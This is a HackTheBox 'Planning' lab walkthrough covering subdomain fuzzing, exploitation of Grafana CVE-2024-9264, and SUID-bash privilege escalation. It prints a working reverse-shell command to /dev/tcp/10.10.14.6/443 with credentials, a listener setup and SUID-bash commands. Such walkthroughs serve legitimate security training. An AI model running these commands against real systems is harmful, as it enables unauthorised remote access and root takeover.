# HackTheBox - Planning
**Youtube video:** https://youtu.be/uoweAzF5uvI
---
## Initial Foothold

**Subdomain Enumeration:**
```bash
# Fuzz for subdomains
ffuf -u http://$IP -H "Host: FUZZ.planning.htb" -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt --fc 301
```

**Exploit:** CVE-2024-9264 - Grafana RCE
- **Payload:** https://github.com/nollium/CVE-2024-9264
```bash
# Install and run exploit
uv run CVE-2024-9264.py

# Execute reverse shell
uv run CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c 'bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"' http://grafana.planning.htb
```

**Listener:**
```bash
# Setup penelope listener
penelope -p 80,443,445,4444
```

---
## Priv Esc

**SSH Port Forwarding:**
```bash
# Forward Grafana port
ssh -L 8000:127.0.0.1:8000 enzo@$IP -f -N
```

**SUID Bash Exploitation:**
```bash

# Copy bash to /opt with SUID bit
cp /bin/bash /opt/bash
chmod +s /opt/bash

# Execute SUID bash
/opt/bash -p
```
